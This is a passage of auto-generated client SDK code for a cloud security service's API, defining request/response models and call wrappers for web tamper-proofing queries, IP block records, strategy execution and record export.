  exclusiveFileType?: [ string ](name='ExclusiveFileType', description='An array that consists of the types of the files that have web tamper proofing disabled.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='9CCD7D51-5E81-5FF5-BD74-813DDD248430'),
  totalCount?: int32(name='TotalCount', description='The total number of types of the files that have web tamper proofing disabled.', example='30'),
}

model DescribeWebLockExclusiveFileTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockExclusiveFileTypeResponseBody(name='body'),
}

async function describeWebLockExclusiveFileTypeWithOptions(runtime: Util.RuntimeOptions): DescribeWebLockExclusiveFileTypeResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeWebLockExclusiveFileType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockExclusiveFileType(): DescribeWebLockExclusiveFileTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockExclusiveFileTypeWithOptions(runtime);
}

model DescribeWebLockFileChangeStatisticsRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='20'),
}

model DescribeWebLockFileChangeStatisticsResponseBody = {
  currentPage?: int32(name='CurrentPage', example='1'),
  list?: [ 
    {
      count?: int32(name='Count', example='33'),
      file?: string(name='File', example='/tmp'),
    }
  ](name='List'),
  pageSize?: int32(name='PageSize', example='20'),
  requestId?: string(name='RequestId', example='709A8C3D-A543-5B79-AB75-361B206F71D9'),
  totalCount?: int32(name='TotalCount', example='200'),
}

model DescribeWebLockFileChangeStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockFileChangeStatisticsResponseBody(name='body'),
}

async function describeWebLockFileChangeStatisticsWithOptions(request: DescribeWebLockFileChangeStatisticsRequest, runtime: Util.RuntimeOptions): DescribeWebLockFileChangeStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockFileChangeStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockFileChangeStatistics(request: DescribeWebLockFileChangeStatisticsRequest): DescribeWebLockFileChangeStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockFileChangeStatisticsWithOptions(request, runtime);
}

model DescribeWebLockFileEventsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  dealed?: string(name='Dealed', description='Specifies whether the event on web tamper proofing is handled. Valid values:

*   **n**: The event on web tamper proofing is handled.
*   **y**: The event on web tamper proofing is not handled.', example='n'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='20'),
  processName?: string(name='ProcessName', description='The name of the process.', example='sys_create'),
  remark?: string(name='Remark', description='The name of the asset.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the names of assets.', example='test-ecs'),
  tsBegin?: long(name='TsBegin', description='The beginning of the time range to query. The value is a UNIX timestamp.', example='1660649981419'),
  tsEnd?: long(name='TsEnd', description='The end of the time range to query. The value is a UNIX timestamp.', example='1660649981419'),
}

model DescribeWebLockFileEventsResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='2'),
  list?: [ 
    {
      count?: long(name='Count', description='The number of attempts.', example='10'),
      ds?: long(name='Ds', description='The timestamp at which the event on web tamper proofing was first detected.', example='1657178400000'),
      eventName?: string(name='EventName', description='The name of the event on web tamper proofing.', example='modify'),
      eventStatus?: string(name='EventStatus', description='The status of the event on web tamper proofing. Valid values:

*   **1**: unhandled
*   **2**: ignored
*   **4**: deprecated
*   **8**: marked as false positive
*   **10**: added to the whitelist
*   **16**: handling
*   **32**: defended
*   **64**: invalid
*   **128**: deleted
*   **512**: automatically handled', example='1'),
      eventType?: string(name='EventType', description='The prevention mode. Valid values:

*   **audit**: Interception Mode
*   **web_lock**: Alert Mode', example='audit'),
      gmtEvent?: long(name='GmtEvent', description='The timestamp at which the event on web tamper proofing was last detected.', example='1657178400000'),
      id?: long(name='Id', description='The ID of the event on web tamper proofing.', example='3555953980'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='sql-test-001'),
      internetIp?: string(name='InternetIp', description='The public IP address of the affected asset.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='172.25.XX.XX'),
      ip?: string(name='Ip', description='The IP address of the asset.', example='8.210.XX.XX'),
      level?: string(name='Level', description='The severity of the event on web tamper proofing. Valid values: **medium**', example='medium'),
      path?: string(name='Path', description='The file path.', example='D:\\test-tamper-proofing\\123.html'),
      processName?: string(name='ProcessName', description='The name of the process.', example='python3.7'),
      processPath?: string(name='ProcessPath', description='The path to the process.', example='C:\\Windows\\explorer.exe'),
      status?: string(name='Status', description='The status of the event on web tamper proofing. Valid values:

*   **1**: unhandled
*   **2**: ignored
*   **4**: deprecated
*   **8**: marked as false positive
*   **10**: added to the whitelist
*   **16**: handling
*   **32**: defended
*   **64**: invalid
*   **128**: deleted
*   **512**: automatically handled', example='1'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='An array that consists of events on web tamper proofing returned.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  totalCount?: int32(name='TotalCount', description='The total number of events on web tamper proofing returned.', example='100'),
}

model DescribeWebLockFileEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockFileEventsResponseBody(name='body'),
}

async function describeWebLockFileEventsWithOptions(request: DescribeWebLockFileEventsRequest, runtime: Util.RuntimeOptions): DescribeWebLockFileEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.processName)) {
    query['ProcessName'] = request.processName;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.tsBegin)) {
    query['TsBegin'] = request.tsBegin;
  }
  if (!Util.isUnset(request.tsEnd)) {
    query['TsEnd'] = request.tsEnd;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockFileEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockFileEvents(request: DescribeWebLockFileEventsRequest): DescribeWebLockFileEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockFileEventsWithOptions(request, runtime);
}

model DescribeWebLockFileTypeSummaryResponseBody = {
  list?: [ 
    {
      count?: int32(name='Count', example='3'),
      type?: string(name='Type', example='jsp'),
    }
  ](name='List'),
  requestId?: string(name='RequestId', example='4BB99533-4FDC-5B9C-A5E4-5AE3E9BE5C78'),
  totalCount?: int32(name='TotalCount', example='639'),
}

model DescribeWebLockFileTypeSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockFileTypeSummaryResponseBody(name='body'),
}

async function describeWebLockFileTypeSummaryWithOptions(runtime: Util.RuntimeOptions): DescribeWebLockFileTypeSummaryResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeWebLockFileTypeSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockFileTypeSummary(): DescribeWebLockFileTypeSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockFileTypeSummaryWithOptions(runtime);
}

model DescribeWebLockInclusiveFileTypeResponseBody = {
  inclusiveFileType?: [ string ](name='InclusiveFileType'),
  requestId?: string(name='RequestId', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
  totalCount?: int32(name='TotalCount', example='15'),
}

model DescribeWebLockInclusiveFileTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockInclusiveFileTypeResponseBody(name='body'),
}

async function describeWebLockInclusiveFileTypeWithOptions(runtime: Util.RuntimeOptions): DescribeWebLockInclusiveFileTypeResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeWebLockInclusiveFileType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockInclusiveFileType(): DescribeWebLockInclusiveFileTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockInclusiveFileTypeWithOptions(runtime);
}

model DescribeWebLockProcessBlockStatisticsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
}

model DescribeWebLockProcessBlockStatisticsResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  list?: [ 
    {
      count?: int32(name='Count', description='The number of processes on the current page.', example='20'),
      process?: string(name='Process', description='The process.', example='cron'),
    }
  ](name='List', description='An array consisting of the statistics on processes.'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  totalCount?: int32(name='TotalCount', description='The total number of processes.', example='100'),
}

model DescribeWebLockProcessBlockStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockProcessBlockStatisticsResponseBody(name='body'),
}

async function describeWebLockProcessBlockStatisticsWithOptions(request: DescribeWebLockProcessBlockStatisticsRequest, runtime: Util.RuntimeOptions): DescribeWebLockProcessBlockStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockProcessBlockStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockProcessBlockStatistics(request: DescribeWebLockProcessBlockStatisticsRequest): DescribeWebLockProcessBlockStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockProcessBlockStatisticsWithOptions(request, runtime);
}

model DescribeWebLockProcessListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  processName?: string(name='ProcessName', description='The name of the process.', example='cron'),
  status?: int32(name='Status', description='Specifies whether the process is added to the process whitelist. Valid values:

*   **1**: The process is added to the process whitelist.
*   **0**: The process is not added to the process whitelist.', example='0'),
}

model DescribeWebLockProcessListResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  list?: [ 
    {
      count?: string(name='Count', description='The number of entries returned on the current page.', example='33'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='test_ecs'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      processName?: string(name='ProcessName', description='The name of the process.', example='cron'),
      processPath?: string(name='ProcessPath', description='The path to the process.', example='/usr/sbin/cron'),
      status?: int32(name='Status', description='Indicates whether the process is added to the process whitelist. Valid values:

*   **1**: The process is added to the process whitelist.
*   **0**: The process is not added to the process whitelist.', example='0'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='An array that consists of details about the process.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='028CF634-5268-5660-9575-48C9ED6BF880'),
  totalCount?: int32(name='TotalCount', description='The total number of processes.', example='200'),
}

model DescribeWebLockProcessListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockProcessListResponseBody(name='body'),
}

async function describeWebLockProcessListWithOptions(request: DescribeWebLockProcessListRequest, runtime: Util.RuntimeOptions): DescribeWebLockProcessListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.processName)) {
    query['ProcessName'] = request.processName;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockProcessList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockProcessList(request: DescribeWebLockProcessListRequest): DescribeWebLockProcessListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockProcessListWithOptions(request, runtime);
}

model DescribeWebLockStatusRequest {
  from?: string(name='From', example='sas'),
  lang?: string(name='Lang', example='zh'),
  sourceIp?: string(name='SourceIp', example='221.214.XXX.XX'),
}

model DescribeWebLockStatusResponseBody = {
  authCount?: int32(name='AuthCount', example='32'),
  bindCount?: int32(name='BindCount', example='2'),
  blockCount?: int32(name='BlockCount', example='48'),
  dirCount?: int32(name='DirCount', example='2'),
  expireTime?: long(name='ExpireTime', example='1688090851000'),
  requestId?: string(name='RequestId', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
  whiteCount?: int32(name='WhiteCount', example='6'),
}

model DescribeWebLockStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockStatusResponseBody(name='body'),
}

async function describeWebLockStatusWithOptions(request: DescribeWebLockStatusRequest, runtime: Util.RuntimeOptions): DescribeWebLockStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockStatus(request: DescribeWebLockStatusRequest): DescribeWebLockStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockStatusWithOptions(request, runtime);
}

model DescribeWebLockTotalFileChangeCountResponseBody = {
  requestId?: string(name='RequestId', example='E70074C8-DFB4-44C5-96C7-909DD231D68A'),
  totalCount?: long(name='TotalCount', example='200'),
}

model DescribeWebLockTotalFileChangeCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockTotalFileChangeCountResponseBody(name='body'),
}

async function describeWebLockTotalFileChangeCountWithOptions(runtime: Util.RuntimeOptions): DescribeWebLockTotalFileChangeCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeWebLockTotalFileChangeCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockTotalFileChangeCount(): DescribeWebLockTotalFileChangeCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockTotalFileChangeCountWithOptions(runtime);
}

model DescribeWebPathRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='20'),
  type?: string(name='Type', example='web_path'),
}

model DescribeWebPathResponseBody = {
  configList?: [ 
    {
      targetList?: [ 
        {
          target?: string(name='Target', example='82048187-bb9b-4e19-8320-7b4ddb97****'),
          targetType?: string(name='TargetType', example='uuid'),
        }
      ](name='TargetList'),
      webPath?: string(name='WebPath', example='/root/www****'),
      webPathType?: string(name='WebPathType', example='def'),
    }
  ](name='ConfigList'),
  count?: int32(name='Count', example='2'),
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='20'),
  requestId?: string(name='RequestId', example='B37C9052-A73E-4707-A024-92477028****'),
  totalCount?: int32(name='TotalCount', example='2'),
}

model DescribeWebPathResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebPathResponseBody(name='body'),
}

async function describeWebPathWithOptions(request: DescribeWebPathRequest, runtime: Util.RuntimeOptions): DescribeWebPathResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebPath',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebPath(request: DescribeWebPathRequest): DescribeWebPathResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebPathWithOptions(request, runtime);
}

model DisableBruteForceRecordRequest {
  blockIp?: string(name='BlockIp', description='The IP address that you want to specify in the policy.', example='8.210.XX.XX'),
  bound?: string(name='Bound', description='The traffic direction that you want to specify in the policy. Valid values:

*   **in**: inbound
*   **out**: outbound', example='in'),
  id?: long(name='Id', description='The ID of the IP address blocking policy.

> You can call the [DescribeBruteForceRecords](~~DescribeBruteForceRecords~~) operation to query the policy ID.', example='114166XX'),
  port?: string(name='Port', description='The port number.', example='*/*'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='cbb9aa80-a8d1-443c-9ff0-2c36cd39****'),
}

model DisableBruteForceRecordResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5EFF53F7-9B2A-58B5-AD06-6B07ACE17133'),
}

model DisableBruteForceRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DisableBruteForceRecordResponseBody(name='body'),
}

async function disableBruteForceRecordWithOptions(request: DisableBruteForceRecordRequest, runtime: Util.RuntimeOptions): DisableBruteForceRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DisableBruteForceRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function disableBruteForceRecord(request: DisableBruteForceRecordRequest): DisableBruteForceRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return disableBruteForceRecordWithOptions(request, runtime);
}

model DisableCustomBlockRecordRequest {
  blockIp?: string(name='BlockIp', example='62.233.XX.XX'),
  bound?: string(name='Bound', example='in'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
}

model DisableCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', example='F749D54C-3CA0-5F68-835C-AD35A2BD29EA'),
}

model DisableCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DisableCustomBlockRecordResponseBody(name='body'),
}

async function disableCustomBlockRecordWithOptions(request: DisableCustomBlockRecordRequest, runtime: Util.RuntimeOptions): DisableCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DisableCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function disableCustomBlockRecord(request: DisableCustomBlockRecordRequest): DisableCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return disableCustomBlockRecordWithOptions(request, runtime);
}

model EnableBruteForceRecordRequest {
  blockIp?: string(name='BlockIp', example='61.155.XX.XX'),
  bound?: string(name='Bound', example='in'),
  id?: long(name='Id', example='116602XX'),
  port?: string(name='Port', example='22/22'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  uuid?: string(name='Uuid', example='71046acb-8bff-4c3b-9163-24deb007****'),
}

model EnableBruteForceRecordResponseBody = {
  requestId?: string(name='RequestId', example='DFAECA37-4660-5EB6-9A18-8FDF56B3****'),
}

model EnableBruteForceRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: EnableBruteForceRecordResponseBody(name='body'),
}

async function enableBruteForceRecordWithOptions(request: EnableBruteForceRecordRequest, runtime: Util.RuntimeOptions): EnableBruteForceRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'EnableBruteForceRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function enableBruteForceRecord(request: EnableBruteForceRecordRequest): EnableBruteForceRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return enableBruteForceRecordWithOptions(request, runtime);
}

model EnableCustomBlockRecordRequest {
  blockIp?: string(name='BlockIp', description='The IP address that is specified in the policy.', example='43.248.XX.XX'),
  bound?: string(name='Bound', description='The traffic direction that is specified in the policy. Valid values:

*   **in**: inbound
*   **out**: outbound', example='in'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
}

model EnableCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F02D5F26-70B9-53BD-9CDF-A316FD11****'),
}

model EnableCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: EnableCustomBlockRecordResponseBody(name='body'),
}

async function enableCustomBlockRecordWithOptions(request: EnableCustomBlockRecordRequest, runtime: Util.RuntimeOptions): EnableCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'EnableCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function enableCustomBlockRecord(request: EnableCustomBlockRecordRequest): EnableCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return enableCustomBlockRecordWithOptions(request, runtime);
}

model ExecStrategyRequest {
  lang?: string(name='Lang', example='zh'),
  strategyId?: int32(name='StrategyId', example='215421'),
}

model ExecStrategyResponseBody = {
  requestId?: string(name='RequestId', example='7F84EBCA-86F8-5AA0-BF74-A0276ECB****'),
}

model ExecStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExecStrategyResponseBody(name='body'),
}

async function execStrategyWithOptions(request: ExecStrategyRequest, runtime: Util.RuntimeOptions): ExecStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExecStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function execStrategy(request: ExecStrategyRequest): ExecStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return execStrategyWithOptions(request, runtime);
}

model ExportRecordRequest {
  exportType?: string(name='ExportType', example='database'),
  lang?: string(name='Lang', example='zh'),
  params?: string(name='Params', example='{"extend":"1","currentPage":1,"pageSize":10}'),
}

model ExportRecordResponseBody = {
  fileName?: string(name='FileName', example='cms_20171101.xlsx'),
  id?: long(name='Id', example='131231'),
  requestId?: string(name='RequestId', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
}

model ExportRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExportRecordResponseBody(name='body'),
}

/**
  * The ID of the exported file.
  *
  * @param request ExportRecordRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return ExportRecordResponse
 */
async function exportRecordWithOptions(request: ExportRecordRequest, runtime: Util.RuntimeOptions): ExportRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportType)) {
    query['ExportType'] = request.exportType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.params)) {
    query['Params'] = request.params;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExportRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * The ID of the exported file.
  *
  * @param request ExportRecordRequest
  * @return ExportRecordResponse
 */
async function exportRecord(request: ExportRecordRequest): ExportRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return exportRecordWithOptions(request, runtime);
